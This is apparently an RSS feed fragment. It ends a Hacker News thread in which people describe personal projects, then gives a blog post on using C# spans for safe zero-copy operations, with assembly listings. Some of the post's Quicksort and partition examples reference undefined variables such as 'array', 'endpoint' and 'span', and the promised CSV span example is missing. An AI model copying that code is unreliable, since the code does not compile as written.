    &lt;p&gt;IME it results in much less context clutter from your test output.&lt;/p&gt;
    &lt;p&gt;Anti-spam email/messaging protocol that is simple, cheap to implement, directly compatible with email/messengers, low false negative rate compared to current spam filtering, free for senders, and does not require the sender to pay to send a message. For people who receive too much marketing spam, survey spam, low-effort cold emails, and want to be able to easily filter spam successfully because you do not want to waste time on them.&lt;/p&gt;
    &lt;p&gt;Future-proofed and will work on AI spam in the future too, unlike current spam filtering methods.&lt;/p&gt;
    &lt;p&gt;Building Bloomberry - an alternative to Builtwith. While the latter focuses on frontend tech, I cover almost every SaaS product category. Want to know companies that use Microsoft Dynamics or Zoom? You can with Bloomberry, but not with Builtwith.&lt;/p&gt;
    &lt;p&gt;I don’t know if this is really necessary, but I created it after doing an in-house CTF challenge, with no LLM rules, and I was giving several LLM CLI’s a lot of leeway and iterating very quickly.&lt;/p&gt;
    &lt;p&gt;I'm working on a super-simple budgeting app called https://4keynumbers.com, which is based on Ramit Sethi's Conscious Spending Plan. It currently syncs my expenses from Plaid and cooks it down into a single chart, with only savings, investments, bills/fixed, and "safe to spend" as categories.&lt;/p&gt;
    &lt;p&gt;This is mostly a nostalgia play--I'm pining for a time when app development was much easier. I'm trying to apply lessons from early Rapid Application Development while still providing a full-featured language.&lt;/p&gt;
    &lt;p&gt;I confess that I haven't gotten any traction at all, but I find it incredibly useful for my own consulting business, so I'm going to keep on working on it.&lt;/p&gt;
    &lt;p&gt;I am creating a webapp to let screenwriters collaborate when writing their scripts.&lt;/p&gt;
    &lt;p&gt;I have several friends in this industry and their tooling is either expensive, not localized for their market or straight away bad (I've seen terrible dataloss).&lt;/p&gt;
    &lt;p&gt;I got some inspiration from linear and am building it on top of ruby on rails with CRDTs.&lt;/p&gt;
    &lt;p&gt;Scriptwriting require specific formatting (set by Hollywood ages ago). Doing this in google docs is really painful. Besides that, people who work in this industry are already used to the format, so if you wanna pitch something to studios, they expect to be in industry format.&lt;/p&gt;
    &lt;p&gt;I’m at a crossroads with my Speed Cubing Competitions listing app (SCComps.com). It’s an iOS app built in Flutter, has around 250 downloads, and currently generates no revenue. I'm spending about $500 a year just to keep it running. There’s little community engagement, and I'm debating whether to double down and rebuild it in Swift—or just shut it down altogether.&lt;/p&gt;
    &lt;p&gt;Trying to build a secure, configurable and easy to use authentication system (relative to my understanding)&lt;/p&gt;
    &lt;p&gt;I have experienced knowledge gaps and blind spots that I am attempting to fix. For example most users worry about security of hashed passwords and yet they do not realize that the TOTP (eg Google Authenticator) use symmetric encryption and quite a lot of the authentication providers store the private key in plain text in their database. List goes on...&lt;/p&gt;
    &lt;p&gt;A script which will find random pictures of anyone in the family from the Immich database, resize them and add metadata on them like where they were taken and when and put them on the TV to show as kind of a screen saver when we're at home.&lt;/p&gt;
    &lt;p&gt;I like this Facebook feature which shows you "Today 10 years ago", Immich, does have it in it's UI too and perhaps I will mix in those pictures also to show on TV.&lt;/p&gt;
    &lt;p&gt;Currently I've been working on https://terragonlabs.com which is a way to orchestrate Claude Code and other agents (Amp, Codex) as background agents.&lt;/p&gt;
    &lt;p&gt;I feel like I am locally constantly bouncing between different agents for different tasks and really wanted to be able to do the same in a remote environment.&lt;/p&gt;
    &lt;p&gt;I'm working on a text-based softball league simulator where you forcibly enlist your friends and family to join your co-ed softball team. You play as their manager/coach/fellow player.&lt;/p&gt;
    &lt;p&gt;Every aspect of the games are narrated in real time so you know what's going on. I'm still in the prototype stage and I've seen some pretty hilarious interactions already.&lt;/p&gt;
    &lt;p&gt;pptx-tools, a collection of cli tools for interacting with Powerpoint presentations. Covers use cases that PowerPoint doesn't support. Currently in the making:&lt;/p&gt;
    &lt;p&gt;* pptx-grep - find text across multiple powerpoints, yield file/slide no and text excerpt of match&lt;/p&gt;
    &lt;p&gt;* pptx-dump - dumps extended info about a powerpoint, such as number of slides, applied master slides, used fonts etc.&lt;/p&gt;
    &lt;p&gt;* pptx-lint - allows to define validation rules for pptx based on content and/or formatting. E.g. presentation must not contain word "TBD", all text must be formatted in Arial etc.&lt;/p&gt;
    &lt;p&gt;Deterministic guarantees, and corrective behavioral monitoring for ai agents (starting with claude code, and ADK). Think security + performance bumper rails. At the cost of 0 context.&lt;/p&gt;
    &lt;p&gt;I was the feature requestor for Claude Code Hooks - and have been involved in ai governance for quite awhile, this is an idea I'm excited about.&lt;/p&gt;
    &lt;p&gt;Ping below if you want to early beta test. everything is open source, no signups.&lt;/p&gt;
    &lt;p&gt;I've been working on writing two appendix sections on knowledge distillation and reinforcement learning for Machine Learning for Drug Discovery [1], which were initiated as tangents to expand coverage of material from a few earlier chapters. I hope to also write these appendix sections up as freely available articles (at least in a condensed form). Thankfully, I'll be able to finish the knowledge distillation section this month but, unfortunately, I need to pivot to finishing out chapter 11 to stay on schedule for full publication.&lt;/p&gt;
    &lt;p&gt;rovr, a terminal file explorer because there just isnt enough competing using the textual framework, i have proper mouse handling thanks to it, that i noticed was missing in superfile, or just wasnt nice to use in yazi im taking a look at asyncio to replace threads in the program to hopefully help performance https://github.com/NSPC911/rovr&lt;/p&gt;
    &lt;p&gt;Adding a self hosted reddit like suggestion board to Kinn (https://kinn.gg). We help game developers analyze player feedback from Discord, Steam, YouTube and more.&lt;/p&gt;
    &lt;p&gt;Im working on (slowly) a very very niche web app to help my wife manage her dog breeding program. Maybe it'll be useful enough for other breeders to use it.&lt;/p&gt;
    &lt;p&gt;I'm working on character.ai for learning Chinese, you chat with characters at your level, and get instant feedback on your writing. It's a way to get a wide amount of comprehensible input in an engaging way that also practices output.&lt;/p&gt;
    &lt;p&gt;This is really cool, I'm interested in this as I'm also a chinese learner and I thought about doing sometihng kinda similar (just locally)&lt;/p&gt;
    &lt;p&gt;I like the UI, really cool project.&lt;/p&gt;
    &lt;p&gt;I think the prompting might need more work to make it natural though. I just tried a "hungover chat with 996" worker, and the responses seemed to be lacking a little too much context&lt;/p&gt;
    &lt;p&gt;Currently working on a prediction market platform. Although big players like kalshi are pushing this narrative very hard right now i think there is space for a more social focused platform where users can play together.&lt;/p&gt;
    &lt;p&gt;I’m working on yet another cloud based coding agent https://seniordev.io/ that connects to an existing GitHub repo, spins up a feature branch, commits incremental changes, and opens a PR. You can jump into an embedded VS Code server to review and tweak the code before merging—no local setup needed. Any feedback is greatly appreciated Thanks!&lt;/p&gt;
    &lt;p&gt;Writing a specification for a personal library app in the hopes I can get AppSheet + Gemini to make one for me. I'm working on library science in general, so it will hopefully implement ideas I have about book classification and entity catalogs.&lt;/p&gt;
    &lt;p&gt;Working on an AI-optimized query language. Like a terse, logical SQL. So smaller models can translate natural languages to DB queries more accurately. Saves lots of compute in RAG.&lt;/p&gt;
    &lt;p&gt;I got a dumb phone. Been messing around with setting a phone number to call to get SMS directions and things of that sort. Then I wanted to build my own phone so I got a LTE module and been messing around with that.&lt;/p&gt;
    &lt;p&gt;About the first part, I am working on something similar for myself. If you want an api to get SMS for free, without needing any 10dlc stuff, check out groupme, which supports SMS.&lt;/p&gt;
    &lt;p&gt;I’ve created an AI-powered app designed to help candidates prepare for Meta’s product manager interviews, with a focus on product execution questions. The app allows you to practice by speaking or typing your responses, then uses AI to score answers against a rubric and track your progress over time.&lt;/p&gt;
    &lt;p&gt;I’m looking for beta testers—happy to share early access if you’re interested! If you are please message me.&lt;/p&gt;
    &lt;p&gt;- hiragana / katakana / time reading / number reading quizzers&lt;/p&gt;
    &lt;p&gt;- learn kanji with FSRS, anki-style&lt;/p&gt;
    &lt;p&gt;- vocab quizzer&lt;/p&gt;
    &lt;p&gt;- the coolest feature (imo) is a "reader": upload Japanese texts (light novels, children's books, etc), then translate them to your native language to practice your reading comprehension. Select text anywhere on the page (with your cursor) to instantly do a dictionary lookup. A LLM evaluates your translation accuracy (0..100%) and suggests other possible interpretations.&lt;/p&gt;
    &lt;p&gt;It's all elixir+liveview+postgres+pgroonga (though there are times when I would like to have SolidJS).&lt;/p&gt;
    &lt;p&gt;I've been considering open-sourcing it due to lack of commercial success, but might try an ad-based approach first.&lt;/p&gt;
    &lt;p&gt;creating a kanban editor for vscode that can integrate images, videos etc. i use it for planning and creating lectures over several weeks. it can export to a marp compatible presentation format. it's coded with claude, because i would not have had the time to do it othervise.&lt;/p&gt;
    &lt;p&gt;For me, I'll probably send an email later to support to ask (no rush, since it's out of stock anyway), but I was checking for info on compatibility with Yamaha (e.g. my Cross Connect) ebikes. It's not on the compatibility list. They make their own (mid-drive) motors (PW-SE on mine I think) and proprietary batteries. They pulled out of the United States market altogether so getting more batteries from them again is doubtful. (Mine currently charges to ~85% and then throws an error code, but it still works for now.) It is a Yamaha 500Wh36V battery pack on the down tube with 3 wires (I just unscrewed where the battery plugs in to see).&lt;/p&gt;
    &lt;p&gt;An extension which treats tabs as a stack - so I can go down a rabbit hole opening new tabs and then use a shortcut to close a tab and take me to the parent of that tab&lt;/p&gt;
    &lt;p&gt;I suppose it has moved from “what are you working” to “what have you worked on” territory, but since I wrapped up the website just about a week ago it still feels quite fresh.&lt;/p&gt;
    &lt;p&gt;Always interested in feedback and what folks find useful! It’s focused on the mechanics of writing understandable software, which I think is especially important in the age of AI slop.&lt;/p&gt;
    &lt;p&gt;Traditional Knowledge: Constrained to Ibn Seerin's classical teachings — trusted by Muslims for over 1,000 years AI-Powered Analysis: Unlock the meaning of your dream with 4,300 dream symbols from the Dictionary of Dreams.&lt;/p&gt;
    &lt;p&gt;Share your dream confidentially, answer a few context questions, and receive your authentic Islamic interpretation in under a minute.&lt;/p&gt;
    &lt;p&gt;This is an MVP which I started &amp;lt;4 weeks ago. Currently validating Desirability, Feasibility, and Viability.&lt;/p&gt;
    &lt;p&gt;Confidentiality is very difficult to guarantee. You may want to put some brackets on what your users can realistically expect and give them tips on how they can stay anonymous. But lovely and novel idea, really neat to see these kind of cross-overs.&lt;/p&gt;
    &lt;p&gt;On the app's dream input page, it specifies a bit more "Your dreams are private and not stored or collected." - would that cover it? Thanks for your feedback and encouragement!&lt;/p&gt;
    &lt;p&gt;That is a 'pinky promise', it may well be true and let's assume you are well intentioned but it leaves the door open to you not being trustworthy after all or someone intercepting the data while it is being processed (for instance, by compromising your service).&lt;/p&gt;
    &lt;p&gt;In order for you to process the dream data you have to at least make a temporary copy. One way to get rid of that is to move the interpretation part to the client side if possible. Another thing you could do is if people are really concerned about the content of a particular dream to suggest they use TOR or some other anonymization (not perfect, I know) service to at least hide their internet location from you, the operator of the service.&lt;/p&gt;
    &lt;p&gt;Does the app itself run entirely within your own infrastructure or does it call out for part of the work?&lt;/p&gt;
    &lt;p&gt;I've see so many HN posts and cmments about CSVs sucking and Unicode control characters as delimiters, that I set about creating a spec and some tools for use with it.&lt;/p&gt;
    &lt;p&gt;Nothing good enough to share as its own post, but its something I'm working on that people may be interested in.&lt;/p&gt;
    &lt;p&gt;Oh hey I can post an update. My little electronic dictionary is finished. Software works and it's all dressed up in a stealth notebook case. (It runs Python now instead of Lisp though)&lt;/p&gt;
    &lt;p&gt;Kind of have been wasting time with Cloudflare workers engine. Trying to build a system that schedules these workers for a lightweight alternative to GitHub actions. If you are interested in WASM feel free to reach out. Looking to connect with other developers working on the WASM space.&lt;/p&gt;
    &lt;p&gt;I've been wondering for years if historical magazines/periodicals could ever be transformed into a modern ebook format. PDF doesn't cut it, but most other efforts are unsatisfactory... part of what makes a magazine a magazine is the rich, mixed content. So, for the past few weeks (months?) I've been taking a stab at it with the science fiction pulps. Started with Analog/Astounding, and I was able to re-typeset the cover (with original art), most of the interior, many of the ads, and so on.&lt;/p&gt;
    &lt;p&gt;For now, I think it would be funny if you put plaintext that says "just bought the milliondollargpt.com and have no idea what to do with it...". Optionally as a hyperlink to your comment I am replying to.&lt;/p&gt;
    &lt;p&gt;I'm writing a programming language for feature-flags/remote-config. I figure a simple DSL has to be an improvement over YAML or a series of forms in a web app.&lt;/p&gt;
    &lt;p&gt;I'm also generally disappointed by the lack of testing that's performed on feature-flag definitions. So I'd like to have a test runner capable of asserting your feature flag's rules matches your intent.&lt;/p&gt;
    &lt;p&gt;I have been prototyping a local-only social media manager initially targeting the game development community. I am sick of all the subscription only platforms such as buffer, hootsuite etc.&lt;/p&gt;
    &lt;p&gt;Initially I have been looking at Mastodon and Bluesky since they have sane APIs.&lt;/p&gt;
    &lt;p&gt;The plan is to make it so that you can sync your data folder either manually (e.g. dropbox, or sneakernet if you want) or a via a basic cheap data plan.&lt;/p&gt;
    &lt;p&gt;I've been building an innovative guided munition for Ukraine for the last 4 months, we have first prototypes made and have arrangements with the testing range to begin flying them soon.&lt;/p&gt;
    &lt;p&gt;1. COCKTAIL-DKG - A distributed key generation protocol for FROST, based on ChillDKG (but generalized to more elliptic curve groups) -- https://github.com/C2SP/C2SP/issues/159&lt;/p&gt;
    &lt;p&gt;3. A reference implementation for the specification I wrote last year for federated Key Transparency, so that the Fediverse can build end-to-end encryption (E2EE) with stronger, less-centralized notion of trust than TOFU -- https://github.com/fedi-e2ee/public-key-directory-specificat...&lt;/p&gt;
    &lt;p&gt;My theory of learning is that you learn the characters better if you learn how to read and write them at the same time. And flash cards are better by giving you as much information as possible about the character.&lt;/p&gt;
    &lt;p&gt;This is fundamentally different from e.g. WaniKani which only teaches you how to read the character and relies on pre-made mnemonics (plus SRS) for easier retention, and from Anki which (normally) has very minimal flash cards, showing only small bits of information per card. When you have the whole dictionary on each card it gives you the opportunity to create the easiest connection with what you already know. This may be some made up story about the components (radicals) in the kanji (like WaniKani does) a word you already know, other kanji sharing the components, etc. The more connections you make the easier it is to learn them.&lt;/p&gt;
    &lt;p&gt;One of the features I personally use extensively is the ability to bookmark words containing the kanji, which will then pop up at the top of the words section in a later review. If I remember the meaning and the reading of the words I have bookmarked for this character during a reading review, I consider mark card as good. If I remember none of them I mark it “again”.&lt;/p&gt;
    &lt;p&gt;A way for people to build LLM-powered webapps and then easily earn as they are used: I use OpenAI API and charge 2x for tokens so that webapp builders can earn on the margin:&lt;/p&gt;
    &lt;p&gt;Yet another online cycling calculator, this time with an emphasis on power/speed difference between different tires.&lt;/p&gt;
    &lt;p&gt;I'm sick and tired of audiophile level bs floating around online forums and I want to create a simple tool for people to fiddle around with different settings to see what really impacts their speed while cycling.&lt;/p&gt;
    &lt;p&gt;As usual - no plans for monetization whatsoever. Nothing fancy either, just an elaborated weekend project.&lt;/p&gt;
    &lt;p&gt;If you like the idea and want to help with graphic design and or html just let me know. :)&lt;/p&gt;
    &lt;p&gt;For the past ten months I've been working on a way to transmit and receive around 10 kilobytes halfway across town. I've blown through government grants totaling in the hundreds of millions of dollars but it seems this is an unsolvable problem.&lt;/p&gt;
    &lt;p&gt;Esperanto havas la mal- prefikso por krei specialcelan antonomion, sed la rezulto ofte mankas klarecon, kaj kiel morfemo mal mem estas morale kondamna: komparu malica, maligna, malversacio kie mal ne estas sinkrone disigebla.&lt;/p&gt;
    &lt;p&gt;Tial mi vorkas por krei liston de ĉiuj mal- vortoj kun sen mal- alternativoj. Fakte ĝi ankaŭ povas servi la kontraŭan celon, provizi pli ĝeneralajn mal- vortojn kiam oni deziras krei verkon pli facile akirebla de ĉia nivelo.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45418675</guid><pubDate>Mon, 29 Sep 2025 20:58:11 +0000</pubDate></item><item><title>Safe zero-copy operations in C#</title><link>https://ssg.dev/safe-zero-copy-operations-in-c/</link><description>&lt;doc fingerprint="ba68c9994a1d92c0"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Safe zero-copy operations in C#&lt;/head&gt;
    &lt;p&gt;My attempt at talking about one of the most underrated features of C#.&lt;/p&gt;
    &lt;p&gt;C# is a versatile language. You can write mobile apps, desktop apps, games, websites, services and APIs with it. You can write it like Java with all the abstractions and &lt;code&gt;AbstractionFactoryClassProvider&lt;/code&gt;s. But differently from Java, you can write low-level and unsafe code too. When I say low-level, I mean without the GC, with raw pointers. &lt;/p&gt;
    &lt;p&gt;Low-level code is usually required for performance or interoperability with C libraries or the operating system. The reason low-level code helps with performance is that it can be used to eliminate runtime checks on memory accesses.&lt;/p&gt;
    &lt;p&gt;Array element accesses are bounds-checked in C# for safety. But, that means that there's performance impact unless the compiler can eliminate a bounds-checking operation. The bounds-checking elimination logic needs to ensure that the array index was already bounds-checked before, or can be assured to be inside bounds during the compile-time. For example, take this simple function:&lt;/p&gt;
    &lt;code&gt;int sum(int[] array)
{
  int sum = 0;
  for (int i = 0; i &amp;lt; array.Length; i++)
  {
    sum += array[i];
  }
  return sum;
}&lt;/code&gt;
    &lt;p&gt;That's an ideal situation for bounds-checking elimination because the index variable &lt;code&gt;i&lt;/code&gt; is created with known boundaries, and it depends on the array's length. The index variable's lifetime is shorter than the array's lifetime and it's guaranteed to be contained valid values throughout the function. The native code produced for &lt;code&gt;sum&lt;/code&gt; has no bounds-checking:&lt;/p&gt;
    &lt;code&gt;L0000	xor	    eax, eax
L0002	xor	    edx, edx
L0004	mov     r8d, [rcx+8]          ; read length
L0008	test    r8d, r8d              ; is empty?
L000b	jle	    short L001c           ; skip the loop
L000d	mov	    r10d, edx
L0010	add	    eax, [rcx+r10*4+0x10] ; sum += array[i];
L0015	inc	    edx                   ; i++
L0017	cmp	    r8d, edx              ; compare length with i
L001a	jg	    short L000d           ; loop if still greater
L001c	ret	&lt;/code&gt;
    &lt;p&gt;But, what if the function signature was slightly different?&lt;/p&gt;
    &lt;code&gt;int sum(int[] array, int startIndex, int endIndex)
{
  int sum = 0;
  for (int i = startIndex; i &amp;lt;= endIndex; i++)
  {
    sum += array[i];
  }
  return sum;
}&lt;/code&gt;
    &lt;p&gt;Now, the C# compiler doesn't have a way to know if the passed &lt;code&gt;startIndex&lt;/code&gt; and &lt;code&gt;endIndex&lt;/code&gt; values are inside the boundaries of &lt;code&gt;array&lt;/code&gt; because their lifetimes are distinct. So the native assembly produced becomes way more involved with bounds-checking operations:&lt;/p&gt;
    &lt;code&gt;L0000	sub		rsp, 0x28				
L0004	xor		eax, eax			; sum = 0
L0006	cmp		edx, r8d			; startIndex &amp;gt; endIndex?
L0009	jg		short L0045			; then skip the entire function
L000b	test	rcx, rcx			; array is null?
L000e	je		short L0031			; then cause NullReferenceException
L0010	mov		r10d, edx
L0013	or		r10d, r8d
L0016	jl		short L0031
L0018	cmp		[rcx+8], r8d		; array.Length &amp;lt;= endIndex ?
L001c	jle		short L0031			; then do bounds-checking
L001e	xchg	ax, ax				; alignment NOP
L0020	mov		r10d, edx
L0023	add		eax, [rcx+r10*4+0x10]   ; sum += array[i]
L0028	inc		edx					; consider i + 1
L002a	cmp		edx, r8d			; i &amp;gt; endIndex?
L002d	jle		short L0020			; no, go on
L002f	jmp		short L0045			; return
L0031	cmp		edx, [rcx+8]		; i &amp;gt; array.Length?
L0034	jae		short L004a			; bounds-checking failed. go to ----+
L0036	mov		r10d, edx												|
L0039	add		eax, [rcx+r10*4+0x10]	; sum += array[i]				|
L003e	inc		edx					; i++								|
L0040	cmp		edx, r8d			; i &amp;lt;= endIndex ?					|
L0043	jle		short L0031			; continue for loop					|
L0045	add		rsp, 0x28												|
L0049	ret							; return sum						|
L004a	call	0x00007ff857ec6200	; throw IndexOutOfRangeException &amp;lt;--+
&lt;/code&gt;
    &lt;p&gt;We could use low-level unsafe functions and pointers in C# (yes, C# supports raw pointers!) to avoid bounds-checking altogether, like this:&lt;/p&gt;
    &lt;code&gt;unsafe int sum(int* ptr, int length)
{
  int* end = ptr + length;
  int sum = 0;
  for (; ptr &amp;lt; end; ptr++)
  {
    sum += *ptr;
  }
  return sum;
}&lt;/code&gt;
    &lt;p&gt;That also creates a very optimized code that supports passing along a sub-portion of an array:&lt;/p&gt;
    &lt;code&gt;L0000	movsxd	rax, edx        
L0003	lea	rax, [rcx+rax*4]    ; end = ptr + length
L0007	xor	edx, edx            ; sum = 0
L0009	cmp	rcx, rax            ; ptr &amp;gt;= end ?
L000c	jae	short L0019         ; then return
L000e	add	edx, [rcx]          ; sum += *ptr
L0010	add	rcx, 4              ; ptr += sizeof(int)
L0014	cmp	rcx, rax            ; ptr &amp;lt; end?
L0017	jb	short L000e         ; then keep looping
L0019	mov	eax, edx
L001b	ret	                    ; return sum&lt;/code&gt;
    &lt;p&gt;Unsafe code and pointer-arithmetic can be very performant as you can see. The problem is that it's too dangerous. With incorrect values of length, you don't simply get an &lt;code&gt;IndexOutOfRangeException&lt;/code&gt; but instead your app either crashes, or returns incorrect results. If your code happened to modify the memory region instead of just reading it, then you could have a nice entry point for a buffer overflow security vulnerability in your app too. Not to mention that all the callers of that function will have to have unsafe blocks too.&lt;/p&gt;
    &lt;p&gt;But it's possible to handle this safe and fast in C# without resorting to esoteric rituals like that. First, how do you solve this problem of indexes to describe a portion of an array and actual boundaries of the array being disconnected from each other? You create a new immutable type that holds these values together. And that type is called a span in C#. Other programming languages may call it a slice. Declaration of &lt;code&gt;Span&lt;/code&gt; type resembles something like this. Well, it's not exactly this, but I want you to understand the concept first:&lt;/p&gt;
    &lt;code&gt;readonly struct Span&amp;lt;T&amp;gt;
{
  readonly T* _ptr;
  readonly int _len;
}&lt;/code&gt;
    &lt;p&gt;It's basically an immutable pointer with length. The great thing about a type like this is that the compiler can assure that once an immutable Span is initialized with correct bounds, it will always be safe to access without any bounds-checking. That means, you can pass around sub-views of arrays or even other spans safely and quickly without the performance overhead.&lt;/p&gt;
    &lt;p&gt;But, how can it be safe? What if the GC decides to throw away the structure that &lt;code&gt;ptr&lt;/code&gt; points to? Well, that's where "ref types" come into play in C#.&lt;/p&gt;
    &lt;p&gt;A ref type is a type that can't leave the stack and escape to the heap, so it's always guaranteed that a &lt;code&gt;T&lt;/code&gt; type will outlive a &lt;code&gt;Span&amp;lt;T&amp;gt;&lt;/code&gt; instance. That's why the actual &lt;code&gt;Span&amp;lt;T&amp;gt;&lt;/code&gt; declaration looks like this:&lt;/p&gt;
    &lt;code&gt;readonly ref struct Span&amp;lt;T&amp;gt;  // notice "ref" 
{
  readonly ref T _ptr;        // notice "ref"
  readonly int _len;
}&lt;/code&gt;
    &lt;p&gt;Since a ref type can only live in stack, it can't be a member of a class, nor can it be assigned to a non-ref variable, like, it can't be boxed either. A ref type can only be contained inside another ref type. It's ref types all the way.&lt;/p&gt;
    &lt;p&gt;Span-based version of our &lt;code&gt;sum&lt;/code&gt; function can eliminate bounds-checking despite that it can now have several super powers. The first one is that it can receive a sub-view of an array too with specific indices:&lt;/p&gt;
    &lt;code&gt;int sum(Span&amp;lt;int&amp;gt; span)
{
  int sum = 0;
  for (int i = 0; i &amp;lt; span.Length; i++)
  {
    sum += span[i];
  }
  return sum;
}&lt;/code&gt;
    &lt;p&gt;For instance you can call this function with &lt;code&gt;sum(array)&lt;/code&gt; or you can call it with a sub-view of an array like &lt;code&gt;sum(array[startIndex..endIndex])&lt;/code&gt;. That wouldn't incur new bounds-checking operations other than when you're trying to slice the array using the range operator. See how the generated assembly code for &lt;code&gt;sum&lt;/code&gt; becomes optimized again:&lt;/p&gt;
    &lt;code&gt;L0000	mov	rax, [rcx]
L0003	mov	ecx, [rcx+8]
L0006	xor	edx, edx            ; sum = 0
L0008	xor	r8d, r8d            ; i = 0
L000b	test	ecx, ecx		; span.Length == 0?
L000d	jle	short L001e
L000f	mov	r10d, r8d
L0012	add	edx, [rax+r10*4]    ; sum += span[i]
L0016	inc	r8d                 ; i++
L0019	cmp	r8d, ecx            ; i &amp;lt; Length?
L001c	jl	short L000f         ; then keep looping
L001e	mov	eax, edx            
L0020	ret						; return sum&lt;/code&gt;
    &lt;p&gt;Another superpower you get is that the ability to declare the data structure you receive immutable in your function signature, so your function is guaranteed not to touch it, and you can find bugs instantly. All you need to do is to replace &lt;code&gt;Span&amp;lt;T&amp;gt;&lt;/code&gt; with &lt;code&gt;ReadOnlySpan&amp;lt;T&amp;gt;&lt;/code&gt;. Then your attempts to modify the span contents will immediately cause a compiler error. Something impossible with regular arrays, even if you declare them &lt;code&gt;readonly&lt;/code&gt;. The &lt;code&gt;readonly&lt;/code&gt; directive only protects the reference from modification not the contents of the data structure.&lt;/p&gt;
    &lt;head rend="h2"&gt;How is it related to zero-copy?&lt;/head&gt;
    &lt;p&gt;Passing along a smaller portion of a larger data structure to relevant APIs used to involve either copying or passing the relevant part's offset and length values along with that data structure. It required the API to support calls with larger structures with offsets. It was impossible to guarantee the safety of such APIs as the relationship between parameters couldn't be established by the compiler or the runtime.&lt;/p&gt;
    &lt;p&gt;It's now both easy and expressive to implement zero-copy operations safely using spans. Consider a Quicksort implementation for instance; it usually has a function like this that works with portions of a given array:&lt;/p&gt;
    &lt;code&gt;int partition(int[] array, int low, int high)
{
  int midpoint = (high + low) / 2; // I know, we'll get there!
  int mid = array[midpoint];

  // tuple swaps in C#! ("..^1" means "Length - 1")
  (array[midpoint], array[^1]) = (array[^1], array[midpoint]);
  int pivotIndex = 0;
  for (int i = low; i &amp;lt; high - 1; i++)
  {
     if (array[i] &amp;lt; mid)
     {
       swap(array, i, pivotIndex);
       pivotIndex += 1;
     }
  }
  (array[midpoint], array[endpoint]) = (array[endpoint], array[midpoint]);
  return pivotIndex;
}&lt;/code&gt;
    &lt;p&gt;This function receives an array and offsets that designate a part of it, and rearranges the items based on a picked value in it. Values smaller than it move to the left, larger than it move to the right.&lt;/p&gt;
    &lt;p&gt;The &lt;code&gt;mid = array[midpoint]&lt;/code&gt; has to be bounds-checked because the compiler can't know if the index is inside the bounds of this array. The &lt;code&gt;for&lt;/code&gt; loop also performs bounds-check for array accesses in the loop, which some of them can be eliminated, but not fully guaranteed. &lt;/p&gt;
    &lt;p&gt;There is also an overflow error because we pass array ranges using &lt;code&gt;high&lt;/code&gt; and &lt;code&gt;low&lt;/code&gt; values: &lt;code&gt;(high+low)&lt;/code&gt; can overflow for very large arrays, and the results would be catastrophic, can even cause buffer overflow exceptions.&lt;/p&gt;
    &lt;p&gt;The &lt;code&gt;partition&lt;/code&gt; function gets recursively called many times by &lt;code&gt;Quicksort&lt;/code&gt; function below, so that means bounds-checking can be a performance issue. &lt;/p&gt;
    &lt;code&gt;void Quicksort(int[] array, int low, int high)
{
  if (array.Length &amp;lt;= 1)
  {
    return;
  }

  int pivot = partition(array, low, high);
  Quicksort(span, low, pivot - 1);
  Quicksort(span, pivot + 1, high);
}&lt;/code&gt;
    &lt;p&gt;With spans, the same Quicksort function looks like this:&lt;/p&gt;
    &lt;code&gt;void Quicksort(Span&amp;lt;int&amp;gt; span)
{
  if (span.Length &amp;lt;= 1)
  {
    return;
  }

  int pivot = partition(span);
  Quicksort(span[..pivot]);
  Quicksort(span[(pivot + 1)..]);
}&lt;/code&gt;
    &lt;p&gt;See how expressive using spans are especially with the range syntax? It lets you get a new span out of an existing span or an array using double dots (&lt;code&gt;..&lt;/code&gt;)? And the partition function even looks much better too:&lt;/p&gt;
    &lt;code&gt;int partition(Span&amp;lt;int&amp;gt; span)
{
  int midpoint = span.Length / 2; // look ma, no buffer overflows!
  int mid = span[midpoint];
  (span[midpoint], span[^1]) = (span[^1], span[midpoint]);
  int pivotIndex = 0;
  for (int i = 0; i &amp;lt; span.Length - 1; i++)
  {
     if (span[i] &amp;lt; mid)
     {
       swap(array, i, pivotIndex);
       pivotIndex += 1;
     }
  }
  (span[midpoint], span[^1]) = (span[^1], span[midpoint]);
  return pivotIndex;
}&lt;/code&gt;
    &lt;p&gt;Because C# spans are also zero-based, it's harder to have buffer overflow problems caused by formulae like &lt;code&gt;(low + high) / 2&lt;/code&gt;. Now, the implementation is as fast as an unsafe implementation with raw pointers, but still extremely safe.&lt;/p&gt;
    &lt;head rend="h2"&gt;New zero-copy operations in .NET runtime&lt;/head&gt;
    &lt;p&gt;I used a recursive example here to show how sub-portions of a larger data structure can be passed to another function, but spans can be used almost everywhere, and now .NET runtime supports zero-copy alternatives of popular functions too.&lt;/p&gt;
    &lt;p&gt;Take &lt;code&gt;String.Split&lt;/code&gt; for example. You can now split a string without creating new copies of every split portion of the string. You can split a CSV line into its parts like this:&lt;/p&gt;
    &lt;code&gt;string csvLine = // .. read CSV line
string[] parts = csvLine.Split(',');

foreach (string part in parts)
{
  Console.WriteLine(part);
}&lt;/code&gt;
    &lt;p&gt;The problem with that is, now you're dealing with newly created 5 buffers with varying lengths. .NET allocates new memory for them, GC keeps track of them. It's slow, it hogs memory. It's problematic especially in loops, and can create GC pressure, slowing your app even more.&lt;/p&gt;
    &lt;p&gt;You can instead cast your CSV line into a &lt;code&gt;ReadOnlySpan&amp;lt;char&amp;gt;&lt;/code&gt; and iterate over its components to write it to the output:&lt;/p&gt;
    &lt;p&gt;The great ROI of that experiment is making zero memory allocations after reading CSV line into memory. A similar logic that improves performance and memory efficiency can be applied everywhere that can receive a &lt;code&gt;Span&amp;lt;T&amp;gt;&lt;/code&gt;/&lt;code&gt;ReadOnlySpan&amp;lt;T&amp;gt;&lt;/code&gt; instead of an array.&lt;/p&gt;
    &lt;head rend="h2"&gt;Embrace the future&lt;/head&gt;
    &lt;p&gt;Spans and slice-like structures in are the future of safe memory operations in modern programming languages. Embrace them. The quick takeaways are:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Use spans over arrays in your function declarations unless you explicitly require a standalone array in your function for some reason. Such a change opens your API into zero-copy optimization scenarios, and calling code will be more expressive.&lt;/item&gt;
      &lt;item&gt;Don't bother with unsafe/pointers if you can code the same logic with spans. You can still perform low-level memory operations without wandering into the dangerous parts of the forest. Your code will still be fast, and yet safer.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Use spans, wherever possible, mostly readonly.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
